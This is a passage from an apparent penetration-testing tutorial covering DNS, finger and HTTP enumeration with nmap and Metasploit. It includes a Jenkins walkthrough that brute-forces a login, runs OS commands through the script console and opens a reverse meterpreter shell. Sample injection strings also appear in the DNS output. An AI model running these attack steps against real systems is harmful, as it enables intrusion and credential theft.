<span class="go">|       The following servers allow recursive queries: 45.33.xx.xx</span>
<span class="go">|     PASS - Multiple name servers</span>
<span class="go">|       Server has 2 name servers</span>
<span class="go">|     PASS - DNS name server IPs are public</span>
<span class="go">|       All DNS IPs were public</span>
<span class="go">|     PASS - DNS server response</span>
<span class="go">|       All servers respond to DNS queries</span>
<span class="go">|     PASS - Missing nameservers reported by parent</span>
<span class="go">|       All DNS servers match</span>
<span class="go">|     PASS - Missing nameservers reported by your nameservers</span>
<span class="go">|_      All DNS servers match</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds</span>
</pre></div>
</div>
</section>
<section id="dns-nsid">
<h4>DNS-nsid<a class="headerlink" href="#dns-nsid" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-nsid.html">dns-nsid.nse</a> : Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sSU -p 53 --script dns-nsid 202.191.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:37 IST</span>
<span class="go">Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)</span>
<span class="go">Host is up (0.097s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">53/tcp open  domain</span>
<span class="go">53/udp open  domain</span>
<span class="go">| dns-nsid:</span>
<span class="go">|_  bind.version: 9.3.3rc2</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds</span>
</pre></div>
</div>
</section>
<section id="dns-recursion">
<h4>DNS-recursion<a class="headerlink" href="#dns-recursion" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-recursion.html">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sU -p 53 --script=dns-recursion 202.191.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:39 IST</span>
<span class="go">Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)</span>
<span class="go">Host is up (0.094s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">53/udp open  domain</span>
<span class="go">|_dns-recursion: Recursion appears to be enabled</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds</span>
</pre></div>
</div>
</section>
<section id="dns-service-discovery">
<h4>DNS-Service-Discovery<a class="headerlink" href="#dns-service-discovery" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html">dns-service-discovery.nse</a> : Attempts to discover target hosts’ services using the DNS Service Discovery protocol. The script first sends a query for _services._dns-sd._udp.local to get a list of services. It then sends a followup query for each one to try to get more information.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Yet to run</span>
<span class="go">nmap --script=dns-service-discovery -p 5353 &lt;target&gt;</span>
</pre></div>
</div>
</section>
<section id="dns-srv-enum">
<h4>DNS-SRV-Enum<a class="headerlink" href="#dns-srv-enum" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:</p>
<ul class="simple">
<li><p>Active Directory Global Catalog</p></li>
<li><p>Exchange Autodiscovery</p></li>
<li><p>Kerberos KDC Service</p></li>
<li><p>Kerberos Passwd Change Service</p></li>
<li><p>LDAP Servers</p></li>
<li><p>SIP Servers</p></li>
<li><p>XMPP S2S</p></li>
<li><p>XMPP C2S</p></li>
</ul>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Yet to run</span>
</pre></div>
</div>
</section>
<section id="dns-zone-transfer">
<h4>DNS-Zone-Transfer<a class="headerlink" href="#dns-zone-transfer" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:49 IST</span>
<span class="go">Nmap scan report for nsztm2.digi.ninja (167.88.xx.xx)</span>
<span class="go">Host is up (0.29s latency).</span>
<span class="go">Other addresses for nsztm2.digi.ninja (not scanned): 64:ff9b::a758:2a5e</span>
<span class="go">rDNS record for 167.88.xx.xx: zonetransfer.me</span>
<span class="go">Not shown: 996 closed ports</span>
<span class="go">PORT     STATE    SERVICE</span>
<span class="go">53/tcp   open     domain</span>
<span class="go">| dns-zone-transfer:</span>
<span class="go">| zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.</span>
<span class="go">| zonetransfer.me.                                HINFO  &quot;Casio fx-700G&quot; &quot;Windows XP&quot;</span>
<span class="go">| zonetransfer.me.                                TXT    &quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;</span>
<span class="go">| zonetransfer.me.                                MX     0 ASPMX.L.GOOGLE.COM.</span>
<span class="go">| zonetransfer.me.                                MX     10 ALT1.ASPMX.L.GOOGLE.COM.</span>
<span class="go">| zonetransfer.me.                                MX     10 ALT2.ASPMX.L.GOOGLE.COM.</span>
<span class="go">| zonetransfer.me.                                MX     20 ASPMX2.GOOGLEMAIL.COM.</span>
<span class="go">| zonetransfer.me.                                MX     20 ASPMX3.GOOGLEMAIL.COM.</span>
<span class="go">| zonetransfer.me.                                MX     20 ASPMX4.GOOGLEMAIL.COM.</span>
<span class="go">| zonetransfer.me.                                MX     20 ASPMX5.GOOGLEMAIL.COM.</span>
<span class="go">| zonetransfer.me.                                A      217.147.xx.xx</span>
<span class="go">| zonetransfer.me.                                NS     nsztm1.digi.ninja.</span>
<span class="go">| zonetransfer.me.                                NS     nsztm2.digi.ninja.</span>
<span class="go">| _sip._tcp.zonetransfer.me.                      SRV    0 0 5060 www.zonetransfer.me.</span>
<span class="go">| 157.177.xx.xx.IN-ADDR.ARPA.zonetransfer.me.   PTR    www.zonetransfer.me.</span>
<span class="go">| asfdbauthdns.zonetransfer.me.                   AFSDB  1 asfdbbox.zonetransfer.me.</span>
<span class="go">| asfdbbox.zonetransfer.me.                       A      127.0.xx.xx</span>
<span class="go">| asfdbvolume.zonetransfer.me.                    AFSDB  1 asfdbbox.zonetransfer.me.</span>
<span class="go">| canberra-office.zonetransfer.me.                A      202.14.xx.xx</span>
<span class="go">| cmdexec.zonetransfer.me.                        TXT    &quot;; ls&quot;</span>
<span class="go">| contact.zonetransfer.me.                        TXT    &quot;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes&quot;</span>
<span class="go">| dc-office.zonetransfer.me.                      A      143.228.xx.xx</span>
<span class="go">| deadbeef.zonetransfer.me.                       AAAA   dead:beaf::</span>
<span class="go">| dr.zonetransfer.me.                             LOC    53.349044 N 1.642646 W 0m 1.0m 10000.0m 10.0m</span>
<span class="go">| DZC.zonetransfer.me.                            TXT    &quot;AbCdEfG&quot;</span>
<span class="go">| email.zonetransfer.me.                          NAPTR  1 1 &quot;P&quot; &quot;E2U+email&quot; &quot;&quot; email.zonetransfer.me.zonetransfer.me.</span>
<span class="go">| email.zonetransfer.me.                          A      74.125.xx.xx</span>
<span class="go">| Info.zonetransfer.me.                           TXT    &quot;ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.&quot;</span>
<span class="go">| internal.zonetransfer.me.                       NS     intns1.zonetransfer.me.</span>
<span class="go">| internal.zonetransfer.me.                       NS     intns2.zonetransfer.me.</span>
<span class="go">| intns1.zonetransfer.me.                         A      167.88.xx.xx</span>
<span class="go">| intns2.zonetransfer.me.                         A      167.88.xx.xx</span>
<span class="go">| office.zonetransfer.me.                         A      4.23.xx.xx</span>
<span class="go">| ipv6actnow.org.zonetransfer.me.                 AAAA   2001:67c:2e8:11::c100:1332</span>
<span class="go">| owa.zonetransfer.me.                            A      207.46.xx.xx</span>
<span class="go">| robinwood.zonetransfer.me.                      TXT    &quot;Robin Wood&quot;</span>
<span class="go">| rp.zonetransfer.me.                             RP     robin.zonetransfer.me. robinwood.zonetransfer.me.</span>
<span class="go">| sip.zonetransfer.me.                            NAPTR  2 3 &quot;P&quot; &quot;E2U+sip&quot; &quot;!^.*$!sip:customer-service@zonetransfer.me!&quot; .</span>
<span class="go">| sqli.zonetransfer.me.                           TXT    &quot;&#39; or 1=1 --&quot;</span>
<span class="go">| sshock.zonetransfer.me.                         TXT    &quot;() { :]}; echo ShellShocked&quot;</span>
<span class="go">| staging.zonetransfer.me.                        CNAME  www.sydneyoperahouse.com.</span>
<span class="go">| alltcpportsopen.firewall.test.zonetransfer.me.  A      127.0.xx.xx</span>
<span class="go">| testing.zonetransfer.me.                        CNAME  www.zonetransfer.me.</span>
<span class="go">| vpn.zonetransfer.me.                            A      174.36.xx.xx</span>
<span class="go">| www.zonetransfer.me.                            A      217.147.xx.xx</span>
<span class="go">| xss.zonetransfer.me.                            TXT    &quot;&#39;&gt;&lt;script&gt;alert(&#39;Boo&#39;)&lt;/script&gt;&quot;</span>
<span class="go">|_zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.</span>
<span class="go">135/tcp  filtered msrpc</span>
<span class="go">445/tcp  filtered microsoft-ds</span>
<span class="go">8333/tcp filtered bitcoin</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-79-finger">
<span id="finger-port-79"></span><h2>Port 79 - Finger<a class="headerlink" href="#port-79-finger" title="Link to this heading"></a></h2>
<section id="id9">
<h3>Metasploit<a class="headerlink" href="#id9" title="Link to this heading"></a></h3>
<section id="finger-service-user-enumerator">
<h4>Finger Service User Enumerator<a class="headerlink" href="#finger-service-user-enumerator" title="Link to this heading"></a></h4>
<p>Used to identify users.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/finger/finger_users</span>
<span class="go">services -p 79 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 172.30.xx.xx:79 - Found user: adm</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: lp</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: uucp</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: nuucp</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: listen</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: bin</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: daemon</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: gdm</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: noaccess</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: nobody</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: nobody4</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: oracle</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: postgres</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: root</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: svctag</span>
<span class="go">[+] 172.30.xx.xx:79 - Found user: sys</span>
<span class="go">[+] 172.30.xx.xx:79 Users found: adm, bin, daemon, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, oracle, postgres, root, svctag, sys, uucp</span>
</pre></div>
</div>
</section>
</section>
<section id="id10">
<h3>Nmap<a class="headerlink" href="#id10" title="Link to this heading"></a></h3>
<section id="finger">
<h4>Finger<a class="headerlink" href="#finger" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/finger.html">finger.nse</a>  : Attempts to retrieve a list of usernames using the finger service.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Yet to run</span>
</pre></div>
</div>
</section>
</section>
<section id="id11">
<h3>Other<a class="headerlink" href="#id11" title="Link to this heading"></a></h3>
<section id="id12">
<h4>finger<a class="headerlink" href="#id12" title="Link to this heading"></a></h4>
<p>Same can be done using finger command</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">finger root 172.30.xx.xx</span>
<span class="go">finger: 172.30.xx.xx: no such user.</span>
<span class="go">Login: root                            Name: root</span>
<span class="go">Directory: /root                       Shell: /bin/bash</span>
<span class="go">Last login Sat Feb  6 22:43 (IST) on tty1</span>
<span class="go">No mail.</span>
<span class="go">No Plan.</span>
</pre></div>
</div>
<p>Need to know weather in your city? Just do finger <a class="reference external" href="mailto:cityname&#37;&#52;&#48;graph&#46;no">cityname<span>&#64;</span>graph<span>&#46;</span>no</a></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">finger newdelhi@graph.no</span>
<span class="go">                  -= Meteogram for india/delhi/new_delhi =-</span>
<span class="go">&#39;C                                                                   Rain</span>
<span class="go">37</span>
<span class="go">36                                 ^^^^^^^^^^^^^^^</span>
<span class="go">35                              ^^^               ^^^</span>
<span class="go">34                           =--                     ^^^</span>
<span class="go">33                        ^^^</span>
<span class="go">32                                                      ^^^</span>
<span class="go">31                  ^^^^^^                                 ^^^^^^</span>
<span class="go">30                                                               ^^^</span>
<span class="go">29^^^^^^=--^^^^^^^^^</span>
<span class="go">28</span>
<span class="go">   01 02 03 04 05_06_07_08_09_10_11_12_13_14_15_16_17_18 19 20 21 22 Hour</span>

<span class="go">   SW SW SW SW  W  W  W  W NW NW NW NW NW NW NW NW  W  W  W SW SW SW Wind dir.</span>
<span class="go">    2  2  2  2  3  5  5  6  7  6  6  6  6  6  6  5  4  2  2  1  2  2 Wind(mps)</span>

<span class="go">Legend left axis:   - Sunny   ^ Scattered   = Clouded   =V= Thunder   # Fog</span>
<span class="go">Legend right axis:  | Rain    ! Sleet       * Snow</span>
<span class="go">[Weather forecast from yr.no, delivered by the Norwegian Meteorological Institute and the NRK.]</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="http">
<span id="id13"></span><h2>HTTP<a class="headerlink" href="#http" title="Link to this heading"></a></h2>
<p>Let’s first get a hold of what services are running on the network by checking the different banners</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">services -p 80 -c port,name,info -u -o /tmp/http.ports</span>
<span class="go">cat /tmp/http.ports | cut -d , -f2,3,4 | sort | uniq | tr -d \&quot; | grep -v port | sort -n</span>
</pre></div>
</div>
<p>Sample Services running</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">80,http,3Com switch http config</span>
<span class="go">80,http,3Com switch webadmin 1.0</span>
<span class="go">80,http,Agranat-EmWeb 5.2.6 HP LaserJet http config</span>
<span class="go">80,http,Allegro RomPager 4.30</span>
<span class="go">80,http,Allen-Bradley 1761-NET-ENIW http config</span>
<span class="go">80,http,Apache-Coyote/1.1 (401-Basic realm=Tomcat Manager Application)</span>
<span class="go">80,http,Apache httpd</span>
<span class="go">80,http,Apache httpd 0.6.5</span>
<span class="go">80,http,Apache httpd 1.3.27 (Unix) (Red-Hat/Linux) PHP/4.1.2 mod_perl/1.24_01</span>
<span class="go">80,http,Apache httpd 2.0.63 (CentOS)</span>
<span class="go">80,http,Apache httpd 2.2.10 (Fedora)</span>
<span class="go">80,http,Apache httpd 2.2.15 (Red Hat)</span>
<span class="go">80,http,Apache httpd 2.2.17 (Win32)</span>
<span class="go">80,http,Apache httpd 2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1</span>
<span class="go">80,http,Apache httpd 2.2.22 (Ubuntu)</span>
<span class="go">80,http,Apache httpd 2.2.3 (Red Hat)</span>
<span class="go">80,http,Apache httpd 2.4.12 (Unix)</span>
<span class="go">80,http,Apache httpd 2.4.9 (Win32) PHP/5.5.12</span>
<span class="go">80,http,Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="go">80,http,AudioCodes MP-202 VoIP adapter http config</span>
<span class="go">80,http,BenQ projector Crestron RoomView</span>
<span class="go">80,http,Boa HTTPd 0.94.14rc19</span>
<span class="go">80,http,BusyBox httpd 1.13</span>
<span class="go">80,http,Canon Pixma IP4000R printer http config KS_HTTP 1.0</span>
<span class="go">80,http,Canon printer web interface</span>
<span class="go">80,http,Check Point NGX Firewall-1</span>
<span class="go">80,http,ChipPC Extreme httpd</span>
<span class="go">80,http,Cisco IOS http config</span>
<span class="go">80,http,Citrix Xen Simple HTTP Server XenServer 5.6.100</span>
<span class="go">80,http,Crestron MPS-200 AV routing system http config</span>
<span class="go">80,http,Crestron PRO2 automation system web server</span>
<span class="go">80,http,Debut embedded httpd 1.20 Brother/HP printer http admin</span>
<span class="go">80,http,Dell N2000-series switch http admin</span>
<span class="go">80,http,Dell PowerVault TL4000 http config</span>
<span class="go">80,http,D-Link print server http config 1.0</span>
<span class="go">80,http,Embedthis HTTP lib httpd</span>
<span class="go">80,http,Gembird/Hawking/Netgear print server http config</span>
<span class="go">80,http,GoAhead WebServer LinkSys SLM2024 or SRW2008 - SRW2016 switch http config</span>
<span class="go">80,http,GoAhead WebServer Router with realtek 8181 chipset http config</span>
<span class="go">80,http,HP-ChaiSOE 1.0 HP LaserJet http config</span>
<span class="go">80,http,HP Deskjet 3050 J610 printer http config Serial CN12E3937Y05HX</span>
<span class="go">80,http,HP Integrated Lights-Out web interface 1.30</span>
<span class="go">80,http,HP LaserJet 1022n printer http config 4.0.xx.xx</span>
<span class="go">80,http,HP LaserJet P2014n printer http config 4.2</span>
<span class="go">80,http,HP Officejet 7610 printer http config Serial CN5293M07X064N</span>
<span class="go">80,http,HP ProCurve 1800-24G switch http config</span>
<span class="go">80,http,Jetty 6.1.x</span>
<span class="go">80,http,Konica Minolta PageScope Web Connection httpd</span>
<span class="go">80,http,Liaison Exchange Commerce Suite</span>
<span class="go">80,http,lighttpd 1.4.33</span>
<span class="go">80,http,Linksys PAP2 VoIP http config</span>
<span class="go">80,http,Lotus Domino httpd</span>
<span class="go">80,http,Mathopd httpd 1.5p6</span>
<span class="go">80,http,Mbedthis-Appweb 2.5.0</span>
<span class="go">80,http,Microsoft HTTPAPI httpd 2.0 SSDP/UPnP</span>
<span class="go">80,http,Microsoft-IIS/8.5 (Powered by ASP.NET)</span>
<span class="go">80,http,Microsoft IIS httpd 10.0</span>
<span class="go">80,http,Microsoft IIS httpd 8.5</span>
<span class="go">80,http,MoxaHttp 1.0</span>
<span class="go">80,http,nginx 1.2.2</span>
<span class="go">80,http,Omron PLC http config</span>
<span class="go">80,http,Oracle HTTP Server Powered by Apache 1.3.22 mod_plsql/3.0.xx.xx.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25</span>
<span class="go">80,http,Panasonic WV-NF284 webcam http config</span>
<span class="go">80,http-proxy,Squid http proxy 2.5.STABLE4</span>
<span class="go">80,http,RapidLogic httpd 1.1</span>
<span class="go">80,http,Samsung SyncThru Web Service M337x 387x 407x series; SN: ZDFABJEF600007W</span>
<span class="go">80,http,uc-httpd 1.0.0</span>
<span class="go">80,http,Virata-EmWeb 6.2.1 HP printer http config</span>
<span class="go">80,http,VMware ESXi 4.1 Server httpd</span>
<span class="go">80,http,VMware ESXi Server httpd</span>
<span class="go">80,http,Web-Server httpd 3.0 Ricoh Aficio printer web image monitor</span>
<span class="go">80,http,Western Digital My Book http config</span>
<span class="go">80,http,Zero One Technology 11 httpd 5.4.2049</span>
<span class="go">80,ipp,Canon printer http config 1.00</span>
<span class="go">80,ipp,HP Officejet Pro 8600 ipp model CM750A; serial CN314B3J9905SN</span>
<span class="go">80,ipp,Web-Server httpd 3.0 NRG copier or Ricoh Aficio printer http config</span>
<span class="go">80,rtsp,</span>
<span class="go">80,soap,gSOAP soap 2.7</span>
<span class="go">80,tcpwrapped,Cisco IOS http config</span>
<span class="go">80,tcpwrapped,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config</span>
<span class="go">80,upnp,Epson Stylus NX230 printer UPnP UPnP 1.0; Epson UPnP SDK 1.0</span>
<span class="go">80,wsman,Openwsman</span>
</pre></div>
</div>
<p>So, A lot of stuff, Let’s test them for one by one.</p>
<section id="webmin">
<span id="http-webmin"></span><h3>Webmin<a class="headerlink" href="#webmin" title="Link to this heading"></a></h3>
<section id="id14">
<h4>Metasploit<a class="headerlink" href="#id14" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access</span>
<span class="go">auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure</span>
<span class="go">exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution</span>
</pre></div>
</div>
<p>but our webmin versions are different.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/admin/webmin/edit_html_fileaccess requires Webmin 1.580 plus it requires authenticated user.</span>
<span class="go">auxiliary/admin/webmin/file_disclosure Webmin (versions prior to 1.290) and Usermin (versions prior to 1.220)</span>
<span class="go">exploit/unix/webapp/webmin_show_cgi_exec in Webmin 1.580</span>
</pre></div>
</div>
<p>Moving on to</p>
</section>
</section>
<section id="jenkins">
<span id="http-jenkins"></span><h3>Jenkins<a class="headerlink" href="#jenkins" title="Link to this heading"></a></h3>
<p>Typically, Jenkins exposes an endpoint (/people or /asynchPeople) that does not require authentication and where all the defined users are listed.</p>
<section id="id15">
<h4>Metasploit<a class="headerlink" href="#id15" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Jenkins-CI Enumeration:   This module enumerates a remote Jenkins-CI installation in an unauthenticated manner, including host operating system and Jenkins installation details.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf &gt; use auxiliary/scanner/http/jenkins_enum</span>
<span class="go">msf auxiliary(jenkins_enum) &gt; set rhosts someexample.com</span>
<span class="go">msf auxiliary(jenkins_enum) &gt; set rport 9000</span>
<span class="go">msf auxiliary(jenkins_enum) &gt; set targeturi /</span>
<span class="go">msf auxiliary(jenkins_enum) &gt; exploit</span>
</pre></div>
</div>
</div></blockquote>
<p>Sample Output</p>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.0.100.195:9000 - Jenkins Version - 1.647</span>
<span class="go">[*] 10.0.100.195:9000 - /script restricted (403)</span>
<span class="go">[*] 10.0.100.195:9000 - /view/All/newJob restricted (403)</span>
<span class="go">[+] 10.0.100.195:9000 - /asynchPeople/ does not require authentication (200)</span>
<span class="go">[*] 10.0.100.195:9000 - /systemInfo restricted (403)</span>
<span class="go">[*] Scanned 1 of 1 hosts (100% complete)</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Jenkins-CI Login Utility: This module attempts to login to a Jenkins-CI instance using a specific user/pass. So, Let’s try with Rockyou wordlist</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf &gt; use auxiliary/scanner/http/jenkins_login</span>
<span class="go">msf auxiliary(jenkins_login) &gt; set username admin</span>
<span class="go">msf auxiliary(jenkins_login) &gt; set pass_file rockyou.txt</span>
<span class="go">msf auxiliary(jenkins_login) &gt; set rhosts someexample.com</span>
<span class="go">msf auxiliary(jenkins_login) &gt; set rport 9000</span>
<span class="go">msf auxiliary(jenkins_login) &gt; set stop_on_success true</span>
<span class="go">msf auxiliary(jenkins_login) &gt; exploit</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:123456 (Incorrect)</span>
<span class="go">[-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:flower (Incorrect)</span>
<span class="go">[-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:playboy (Incorrect)</span>
<span class="go">[+] 10.0.100.195:9000 - LOGIN SUCCESSFUL: admin:hello</span>
<span class="go">[*] Scanned 1 of 1 hosts (100% complete)</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>Jenkins-CI Script-Console Java Execution: This module uses the Jenkins-CI Groovy script console to execute OS commands using Java. As we have the credentials obtained above, we can use them to execute OS commands</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf &gt; use exploit/multi/http/jenkins_script_console</span>
<span class="go">msf exploit(jenkins_script_console) &gt; set username admin</span>
<span class="go">msf exploit(jenkins_script_console) &gt; set password hello</span>
<span class="go">msf exploit(jenkins_script_console) &gt; set rhost someexample.com</span>
<span class="go">msf exploit(jenkins_script_console) &gt; set rport 9000</span>
<span class="go">msf exploit(jenkins_script_console) &gt; set targeturi /</span>
<span class="go">msf exploit(jenkins_script_console) &gt; set target 1</span>
<span class="go">msf exploit(jenkins_script_console) &gt; exploit</span>

<span class="go">[*] Started reverse TCP handler on 10.0.100.245:4444</span>
<span class="go">[*] Checking access to the script console</span>
<span class="go">[*] Logging in...</span>
<span class="go">[*] someexample.com:9000 - Sending Linux stager...</span>
<span class="go">[*] Transmitting intermediate stager for over-sized stage...(105 bytes)</span>
<span class="go">[*] Sending stage (1495599 bytes) to 10.0.100.195</span>
<span class="go">[*] Meterpreter session 2 opened (10.0.100.245:4444 -&gt; 10.0.100.195:44531) at 2016-04-18 18:13:30 +0200</span>
<span class="go">[!] Deleting /tmp/AaqyV payload file</span>

<span class="go">meterpreter &gt; shell</span>
<span class="go">Process 1840 created.</span>
<span class="go">Channel 1 created.</span>
<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
<span class="gp">$ </span>whoami
<span class="go">jenkins</span>
<span class="gp">$ </span>id
<span class="go">uid=109(jenkins) gid=117(jenkins) groups=117(jenkins)</span>
<span class="gp">$</span>
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><p>If the above metasploit modules doesn’t work, we can perform code execution manually. Visit the jenkins web page &gt; Manage Jenkins (options on the left side) &gt; script console . In the script console page. copy and paste the below code into the editable area.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">def sout = new StringBuffer(), serr = new StringBuffer()</span>
<span class="go">def proc = &#39;[INSERT COMMAND]&#39;.execute()</span>
<span class="go">proc.consumeProcessOutput(sout, serr)</span>
<span class="go">proc.waitForOrKill(1000)</span>
<span class="go">println &quot;out&gt; $sout err&gt; $serr&quot;</span>
</pre></div>
</div>
<p>In place of ‘[INSERT COMMAND]’ we can use powershell Empire launcher or Web_delivery powershell inject code to get an agent or meterpreter shell on our attacking machine.</p>
<p>The above has been taken from <a class="reference external" href="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password">Hacking Jenkins Servers with No Password</a> Also, Leonjza has written a blog <a class="reference external" href="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/">Jenkins to Meterpreter - toying with powersploit</a> which could provide more idea.</p>
</div></blockquote>
</section>
</section>
<section id="apache-tomcat">
<span id="http-apache-tomcat"></span><h3>Apache Tomcat<a class="headerlink" href="#apache-tomcat" title="Link to this heading"></a></h3>
<p>Searching for Tomcat</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">services -S &quot;Tomcat&quot;</span>

<span class="go">Services</span>
<span class="go">========</span>

<span class="go">host          port  proto  name      state  info</span>
<span class="go">----          ----  -----  ----      -----  ----</span>
<span class="go">10.10.xx.xx   8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="go">10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 (401-Basic realm=&quot;Tomcat Manager Application&quot;)</span>
<span class="go">10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 (401-Basic realm=&quot;Tomcat Manager Application&quot;)</span>
<span class="go">10.10.xx.xx   1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="go">10.10.xx.xx   80    tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="go">10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 (401-Basic realm=&quot;Tomcat Manager Application&quot;)</span>
<span class="go">10.10.xx.xx   1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="go">10.10.xx.xx   8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="go">10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 (401-Basic realm=&quot;Tomcat Manager Application&quot;)</span>
<span class="go">10.17.xx.xx   8081  tcp    http      open   Apache-Coyote/1.1 (401-Basic realm=&quot;Tomcat Manager Application&quot;)</span>
<span class="go">10.23.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1</span>
